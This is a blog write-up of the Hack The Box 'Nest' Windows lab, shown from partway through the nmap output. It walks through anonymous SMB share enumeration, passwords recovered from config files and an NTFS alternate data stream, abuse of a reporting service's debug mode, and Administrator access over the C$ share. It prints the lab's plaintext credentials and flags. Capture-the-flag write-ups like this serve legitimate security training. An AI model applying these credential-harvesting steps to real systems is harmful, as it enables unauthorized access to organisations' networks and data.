SF:,&#34;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;\r\nUnrecognised\x20
SF:command\r\n&gt;&#34;)%r(RTSPRequest,3A,&#34;\r\nHQK\x20Reporting\x20Service\x20V1\
SF:.2\r\n\r\n&gt;\r\nUnrecognised\x20command\r\n&gt;&#34;)%r(RPCCheck,21,&#34;\r\nHQK\x2
SF:0Reporting\x20Service\x20V1\.2\r\n\r\n&gt;&#34;)%r(DNSVersionBindReqTCP,21,&#34;\r
SF:\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;&#34;)%r(DNSStatusRequestTCP
SF:,21,&#34;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;&#34;)%r(Help,F2,&#34;\r\
SF:nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;\r\nThis\x20service\x20al
SF:lows\x20users\x20to\x20run\x20queries\x20against\x20databases\x20using\
SF:x20the\x20legacy\x20HQK\x20format\r\n\r\n---\x20AVAILABLE\x20COMMANDS\x
SF:20---\r\n\r\nLIST\r\nSETDIR\x20&lt;Directory_Name&gt;\r\nRUNQUERY\x20&lt;Query_I
SF:D&gt;\r\nDEBUG\x20&lt;Password&gt;\r\nHELP\x20&lt;Command&gt;\r\n&gt;&#34;)%r(SSLSessionReq,2
SF:1,&#34;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;&#34;)%r(TerminalServer
SF:Cookie,21,&#34;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;&#34;)%r(TLSSes
SF:sionReq,21,&#34;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;&#34;)%r(Kerbe
SF:ros,21,&#34;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;&#34;)%r(SMBProgNe
SF:g,21,&#34;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;&#34;)%r(X11Probe,21
SF:,&#34;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;&#34;)%r(FourOhFourReque
SF:st,3A,&#34;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;\r\nUnrecognise
SF:d\x20command\r\n&gt;&#34;)%r(LPDString,21,&#34;\r\nHQK\x20Reporting\x20Service\x20
SF:V1\.2\r\n\r\n&gt;&#34;)%r(LDAPSearchReq,21,&#34;\r\nHQK\x20Reporting\x20Service\x2
SF:0V1\.2\r\n\r\n&gt;&#34;)%r(LDAPBindReq,21,&#34;\r\nHQK\x20Reporting\x20Service\x20
SF:V1\.2\r\n\r\n&gt;&#34;)%r(SIPOptions,3A,&#34;\r\nHQK\x20Reporting\x20Service\x20V1
SF:\.2\r\n\r\n&gt;\r\nUnrecognised\x20command\r\n&gt;&#34;)%r(LANDesk-RC,21,&#34;\r\nHQK
SF:\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;&#34;)%r(TerminalServer,21,&#34;\r\nH
SF:QK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;&#34;);

Host script results:
|_clock-skew: 2m28s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-03-23T20:29:44
|_  start_date: 2020-03-23T19:20:32

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 206.45 seconds
</code></pre><p>So we have SMBv2 + unknown service on port 4386.</p><p><a href=https://github.com/byt3bl33d3r/CrackMapExec>CrackMapExec</a>, <code>smb-enum-shares.nse</code> and <a href=https://github.com/CiscoCXSecurity/enum4linux>enum4linux</a> don&rsquo;t find any
shares because they support only SMB v1 that is disabled.</p><p>But <code>smbclient</code> and msf modules works. So let&rsquo;s start <a href=https://www.metasploit.com/>metasploit</a> console (<code>msfconsole</code>).</p><p><strong>BlackArch</strong>: <code>pacman -S metasploit</code></p><pre tabindex=0><code>msf5 auxiliary(scanner/smb/smb_enumshares) &gt; run

[+] 10.10.10.178:445      - ADMIN$ - (DISK) Remote Admin
[+] 10.10.10.178:445      - C$ - (DISK) Default share
[+] 10.10.10.178:445      - Data - (DISK)
[+] 10.10.10.178:445      - IPC$ - (IPC) Remote IPC
[+] 10.10.10.178:445      - Secure$ - (DISK)
[+] 10.10.10.178:445      - Users - (DISK)
[*] 10.10.10.178:         - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

msf5 auxiliary(scanner/smb/smb2) &gt; run

[+] 10.10.10.178:445      - 10.10.10.178 supports SMB 2 [dialect 255.2] and has been online for 1 hours
[*] 10.10.10.178:445      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
</code></pre><p>I found a few SMBv2 shares with <a href=https://www.metasploit.com/>metasploit</a> but we can do the same thing
with <code>smbclient</code>.</p><p><strong>BlackArch</strong>: <code>pacman -S smbclient</code></p><pre tabindex=0><code>$ smbclient -L 10.10.10.178 -N
Unable to initialize messaging context

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Data            Disk
        IPC$            IPC       Remote IPC
        Secure$         Disk
        Users           Disk
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.178 failed (Error NT_STATUS_IO_TIMEOUT)
Unable to connect with SMB1 -- no workgroup available
</code></pre><p>We can anonymously connect to <code>Users</code> share and list folders in there to list
users:</p><pre tabindex=0><code>$ smbclient -N \\\\10.10.10.178\\Users
Unable to initialize messaging context
Try &#34;help&#34; to get a list of possible commands.
smb: \&gt; recurse on
smb: \&gt; prompt off
smb: \&gt; mget *
NT_STATUS_ACCESS_DENIED listing \Administrator\*
NT_STATUS_ACCESS_DENIED listing \C.Smith\*
NT_STATUS_ACCESS_DENIED listing \L.Frost\*
NT_STATUS_ACCESS_DENIED listing \R.Thompson\*
NT_STATUS_ACCESS_DENIED listing \TempUser\*
</code></pre><p>This way we found 5 users.</p><p>Currently we can&rsquo;t enumerate what is inside <code>Secure</code> share.</p><pre tabindex=0><code>$ smbclient -N \\\\10.10.10.178\\Secure
Unable to initialize messaging context
tree connect failed: NT_STATUS_BAD_NETWORK_NAME
</code></pre><p>By enumerating the <code>Data</code> share we can find some interesting files:</p><pre tabindex=0><code>$ smbclient -N \\\\10.10.10.178\\Data
Unable to initialize messaging context
Try &#34;help&#34; to get a list of possible commands.
smb: \&gt; recurse on
smb: \&gt; prompt off
smb: \&gt; mget *
NT_STATUS_ACCESS_DENIED listing \IT\*
NT_STATUS_ACCESS_DENIED listing \Production\*
NT_STATUS_ACCESS_DENIED listing \Reports\*
getting file \Shared\Maintenance\Maintenance Alerts.txt of size 48 as Maintenance Alerts.txt (0,4 KiloBytes/sec) (average 0,4 KiloBytes/sec)
getting file \Shared\Templates\HR\Welcome Email.txt of size 425 as Welcome Email.txt (0,5 KiloBytes/sec) (average 0,5 KiloBytes/sec)
</code></pre><p>By reading a welcome email we can find a generic account:</p><pre tabindex=0><code>$ cat smb/Shared/Templates/HR/Welcome\ Email.txt
We would like to extend a warm welcome to our newest member of staff, &lt;FIRSTNAME&gt; &lt;SURNAME&gt;

You will find your home folder in the following location:
\\HTB-NEST\Users\&lt;USERNAME&gt;

If you have any issues accessing specific services or workstations, please inform the
IT department and use the credentials below until all systems have been set up for you.

Username: TempUser
Password: welcome2019

Thank you
HR
</code></pre><h3 id=network-exploration-finding-csmith>Network Exploration: finding c.smith<a hidden class=anchor aria-hidden=true href=#network-exploration-finding-csmith>#</a></h3><p><strong>TL;DR</strong>: listing SMB shares again</p><p>We can enumerate <code>Data</code> share again but using the <code>TempUser</code> account this time,
to list files we weren&rsquo;t able to see earlier:</p><pre tabindex=0><code>$ smbclient \\\\10.10.10.178\\Data -U TempUser
Unable to initialize messaging context
Enter WORKGROUP\TempUser&#39;s password:
Try &#34;help&#34; to get a list of possible commands.
smb: \&gt; recurse on
smb: \&gt; prompt off
smb: \&gt; mget *
getting file \IT\Configs\Adobe\editing.xml of size 246 as editing.xml (1,9 KiloBytes/sec) (average 1,9 KiloBytes/sec)
getting file \IT\Configs\Adobe\Options.txt of size 0 as Options.txt (0,0 KiloBytes/sec) (average 1,1 KiloBytes/sec)
getting file \IT\Configs\Adobe\projects.xml of size 258 as projects.xml (0,4 KiloBytes/sec) (average 0,6 KiloBytes/sec)
getting file \IT\Configs\Adobe\settings.xml of size 1274 as settings.xml (10,0 KiloBytes/sec) (average 1,8 KiloBytes/sec)
getting file \IT\Configs\Atlas\Temp.XML of size 1369 as Temp.XML (4,1 KiloBytes/sec) (average 2,4 KiloBytes/sec)
getting file \IT\Configs\Microsoft\Options.xml of size 4598 as Options.xml (36,2 KiloBytes/sec) (average 5,3 KiloBytes/sec)
getting file \IT\Configs\NotepadPlusPlus\config.xml of size 6451 as config.xml (50,4 KiloBytes/sec) (average 8,9 KiloBytes/sec)
getting file \IT\Configs\NotepadPlusPlus\shortcuts.xml of size 2108 as shortcuts.xml (16,6 KiloBytes/sec) (average 9,5 KiloBytes/sec)
getting file \IT\Configs\RU Scanner\RU_config.xml of size 270 as RU_config.xml (2,1 KiloBytes/sec) (average 9,0 KiloBytes/sec)
getting file \Shared\Maintenance\Maintenance Alerts.txt of size 48 as Maintenance Alerts.txt (0,4 KiloBytes/sec) (average 8,4 KiloBytes/sec)
getting file \Shared\Templates\HR\Welcome Email.txt of size 425 as Welcome Email.txt (3,4 KiloBytes/sec) (average 8,1 KiloBytes/sec)
</code></pre><p>One of the file we retrieved is containing a password:</p><pre tabindex=0><code>$ grep -ri pass smb
smb/IT/Configs/RU Scanner/RU_config.xml:  &lt;Password&gt;fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=&lt;/Password&gt;
smb/Shared/Templates/HR/Welcome Email.txt:Password: welcome2019

$ cat &#39;smb/IT/Configs/RU Scanner/RU_config.xml&#39;
&lt;?xml version=&#34;1.0&#34;?&gt;
&lt;ConfigFile xmlns:xsi=&#34;http://www.w3.org/2001/XMLSchema-instance&#34; xmlns:xsd=&#34;http://www.w3.org/2001/XMLSchema&#34;&gt;
  &lt;Port&gt;389&lt;/Port&gt;
  &lt;Username&gt;c.smith&lt;/Username&gt;
  &lt;Password&gt;fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=&lt;/Password&gt;
&lt;/ConfigFile&gt;
</code></pre><p>The <em>RU Scanner</em> password is ciphered but pasting
<code>fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=</code> in a search we can find some
code snippets that are able to decipher it.</p><ul><li>VB.Net: <a href=https://dotnetfiddle.net/kiYWi4>https://dotnetfiddle.net/kiYWi4</a></li><li>VB.Net: <a href=https://dotnetfiddle.net/vYnZLb>https://dotnetfiddle.net/vYnZLb</a></li></ul><p>Deciphered password is <code>xRxRxPANCAK3SxRxRx</code> for <code>c.smith</code> user.</p><p>There is another file hinting us some files:</p><pre tabindex=0><code>$ tail smb/IT/Configs/NotepadPlusPlus/config.xml
        &lt;Find name=&#34;redeem on&#34; /&gt;
        &lt;Find name=&#34;192&#34; /&gt;
        &lt;Replace name=&#34;C_addEvent&#34; /&gt;
    &lt;/FindHistory&gt;
    &lt;History nbMaxFile=&#34;15&#34; inSubMenu=&#34;no&#34; customLength=&#34;-1&#34;&gt;
        &lt;File filename=&#34;C:\windows\System32\drivers\etc\hosts&#34; /&gt;
        &lt;File filename=&#34;\\HTB-NEST\Secure$\IT\Carl\Temp.txt&#34; /&gt;
        &lt;File filename=&#34;C:\Users\C.Smith\Desktop\todo.txt&#34; /&gt;
    &lt;/History&gt;
&lt;/NotepadPlus&gt;
</code></pre><p>So we can go back to <code>Users</code> share with a real user this time (<code>c.smith</code>) and
download all his personal files.</p><pre tabindex=0><code>$ smbclient \\\\10.10.10.178\\Users -U &#39;c.smith&#39;
smb: \&gt; recurse on
smb: \&gt; prompt off
smb: \&gt; mget *
NT_STATUS_ACCESS_DENIED listing \Administrator\*
getting file \C.Smith\HQK Reporting\AD Integration Module\HqkLdap.exe of size 17408 as HqkLdap.exe (42,7 KiloBytes/sec) (average 42,7 KiloBytes/sec)
getting file \C.Smith\HQK Reporting\Debug Mode Password.txt of size 0 as Debug Mode Password.txt (0,0 KiloBytes/sec) (average 34,7 KiloBytes/sec)
getting file \C.Smith\HQK Reporting\HQK_Config_Backup.xml of size 249 as HQK_Config_Backup.xml (1,9 KiloBytes/sec) (average 27,8 KiloBytes/sec)
getting file \C.Smith\user.txt of size 32 as user.txt (0,3 KiloBytes/sec) (average 23,2 KiloBytes/sec)
NT_STATUS_ACCESS_DENIED listing \L.Frost\*
NT_STATUS_ACCESS_DENIED listing \R.Thompson\*
NT_STATUS_ACCESS_DENIED listing \TempUser\*
</code></pre><p>This is where we find the user flag:</p><pre tabindex=0><code>cat smb/C.Smith/user.txt
cf71b25404be5d84fd827e05f426e987
</code></pre><h3 id=alternate-data-stream-ads>Alternate Data Stream (ADS)<a hidden class=anchor aria-hidden=true href=#alternate-data-stream-ads>#</a></h3><p><strong>TL;DR</strong>: password of HQK Reporting via ADS</p><p>Inside <code>Users</code> share, in the <code>C.Smith</code> folder, there are files related to
<code>HQK Reporting</code> software.</p><p>There is a promising <code>Debug Mode Password.txt</code> files but the files ize is 0 byte.</p><p>This gives us an hint an ADS (Alternate Data Stream) may be used.</p><p>As you can see below the default <code>$DATA</code> stream is 0 byte when an alternate
stream named <code>Password</code> is 15 bytes. So we can download the file via the non-default
data stream.</p><pre tabindex=0><code>$ smbclient \\\\10.10.10.178\\Users -U &#39;c.smith&#39;
Unable to initialize messaging context
Enter WORKGROUP\c.smith&#39;s password:
Try &#34;help&#34; to get a list of possible commands.
smb: \&gt; cd &#34;C.Smith\HQK Reporting&#34;
smb: \C.Smith\HQK Reporting\&gt; allinfo &#34;Debug Mode Password.txt&#34;
altname: DEBUGM~1.TXT
create_time:    ven. ao├╗t  9 01:06:12 2019 CEST
access_time:    ven. ao├╗t  9 01:06:12 2019 CEST
write_time:     ven. ao├╗t  9 01:08:17 2019 CEST
change_time:    ven. ao├╗t  9 01:08:17 2019 CEST
attributes: A (20)
stream: [::$DATA], 0 bytes
stream: [:Password:$DATA], 15 bytes
smb: \C.Smith\HQK Reporting\&gt; get &#34;Debug Mode Password.txt:Password:$DATA&#34;
getting file \C.Smith\HQK Reporting\Debug Mode Password.txt:Password:$DATA of size 15 as Debug Mode Password.txt:Password:$DATA (0,1 KiloBytes/sec) (average 0,1 KiloBytes/sec)
smb: \C.Smith\HQK Reporting\&gt;
</code></pre><p>In this stream the file contains the password for accessing teh debug mode:</p><pre tabindex=0><code>$ cat smb/Debug\ Mode\ Password.txt:Password:\$DATA
WBQ201953D8w
</code></pre><h3 id=network-service-exploitation-finding-administrator>Network service exploitation: finding Administrator<a hidden class=anchor aria-hidden=true href=#network-service-exploitation-finding-administrator>#</a></h3><p><strong>TL;DR</strong>: HQK Reporting debug mode, read LDAP config for Admin password</p><p>Now looking at the backup config file <code>HQK_Config_Backup.xml</code> we can see the
service is running on port <code>4386</code>. The open port we saw earlier with <a href=https://nmap.org/>nmap</a>.</p><pre tabindex=0><code>$ cat C.Smith/HQK\ Reporting/HQK_Config_Backup.xml
&lt;?xml version=&#34;1.0&#34;?&gt;
&lt;ServiceSettings xmlns:xsi=&#34;http://www.w3.org/2001/XMLSchema-instance&#34; xmlns:xsd=&#34;http://www.w3.org/2001/XMLSchema&#34;&gt;
  &lt;Port&gt;4386&lt;/Port&gt;
  &lt;QueryDirectory&gt;C:\Program Files\HQK\ALL QUERIES&lt;/QueryDirectory&gt;
&lt;/ServiceSettings&gt;
</code></pre><p>So let&rsquo;s open a TCP socket with <code>telnet</code> to interact with the protocol:</p><pre tabindex=0><code>$ telnet 10.10.10.178 4386 
Trying 10.10.10.178...
Connected to 10.10.10.178.
Escape character is &#39;^]&#39;.

HQK Reporting Service V1.2

&gt;help

This service allows users to run queries against databases using the legacy HQK format

--- AVAILABLE COMMANDS ---

LIST
SETDIR &lt;Directory_Name&gt;
RUNQUERY &lt;Query_ID&gt;
DEBUG &lt;Password&gt;
HELP &lt;Command&gt;
</code></pre><p>We can see there is a <code>DEBUG &lt;Password></code> command requiring a password.
All good we have one!</p><pre tabindex=0><code>&gt;DEBUG WBQ201953D8w

Debug mode enabled. Use the HELP command to view additional commands that are now available
&gt;help

This service allows users to run queries against databases using the legacy HQK format

--- AVAILABLE COMMANDS ---

LIST
SETDIR &lt;Directory_Name&gt;
RUNQUERY &lt;Query_ID&gt;
DEBUG &lt;Password&gt;
HELP &lt;Command&gt;
SERVICE
SESSION
SHOWQUERY &lt;Query_ID&gt;
</code></pre><p>We have 3 new commands now, but let&rsquo;s start we the other commands we already had.</p><pre tabindex=0><code>&gt;LIST

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[DIR]  COMPARISONS
[1]   Invoices (Ordered By Customer)
[2]   Products Sold (Ordered By Customer)
[3]   Products Sold In Last 30 Days

Current Directory: ALL QUERIES
</code></pre><p>It looks like <code>LIST</code> = <code>ls</code> and <code>SETDIR</code> = <code>cd</code>, it&rsquo;s obvious.</p><p>We are currently in <code>ALL QUERIES</code> directory. Let&rsquo;s go back upper in the tree:</p><pre tabindex=0><code>&gt;setdir ..

Current directory set to HQK
&gt;list

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[DIR]  ALL QUERIES
[DIR]  LDAP
[DIR]  Logs
[1]   HqkSvc.exe
[2]   HqkSvc.InstallState
[3]   HQK_Config.xml

Current Directory: HQK
</code></pre><p>We went in <code>HQK</code> directory and there is a <code>LDAP</code> directory in it.
Let&rsquo;s see this one:</p><pre tabindex=0><code>&gt;setdir LDAP

Current directory set to LDAP
&gt;list

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[1]   HqkLdap.exe
[2]   Ldap.conf

Current Directory: LDAP
</code></pre><p>There is a config file and config files are prone to give passwords, so let&rsquo;s
read it.
Hopefully with the debug mode we unlocked the <code>showquery</code> = <code>cat</code>.</p><pre tabindex=0><code>&gt;showquery 2

Domain=nest.local
Port=389
BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local
User=Administrator
Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=
</code></pre><p>This password is ciphered too, as earlier let&rsquo;s paste it in a search engine:</p><ul><li>VB.Net: <a href=https://dotnetfiddle.net/LdhDaa>https://dotnetfiddle.net/LdhDaa</a></li><li>C#: <a href=https://dotnetfiddle.net/ndCO9U>https://dotnetfiddle.net/ndCO9U</a></li></ul><p>So the deciphered password is: <code>XtH4nkS4Pl4y1nGX</code>.</p><p>Let&rsquo;s get root flag via the <code>C$</code> share with the <code>Administrator</code> account:</p><pre tabindex=0><code>$ smbclient &#39;\\10.10.10.178\C$&#39; -U &#39;Administrator&#39;
Unable to initialize messaging context
Enter WORKGROUP\Administrator&#39;s password: 
Try &#34;help&#34; to get a list of possible commands.
smb: \&gt; cd Users\Administrator\Desktop
smb: \Users\Administrator\Desktop\&gt; ls
  .                                  DR        0  Sun Jan 26 08:20:50 2020
  ..                                 DR        0  Sun Jan 26 08:20:50 2020
  desktop.ini                       AHS      282  Sat Jan 25 23:02:44 2020
  root.txt                            A       32  Tue Aug  6 00:27:26 2019

                10485247 blocks of size 4096. 6545277 blocks available
smb: \Users\Administrator\Desktop\&gt; mget root.txt
Get file root.txt? y
getting file \Users\Administrator\Desktop\root.txt of size 32 as root.txt (0,3 KiloBytes/sec) (average 0,3 KiloBytes/sec)

$ cat root.txt
6594c2eb084bc0f08a42f0b94b878c41
</code></pre></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/hackthebox/>Hackthebox</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/windows/>Windows</a></li><li><a href=https://s4ch.github.io/tags/easy/>Easy</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://s4ch.github.io/>CyFun</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>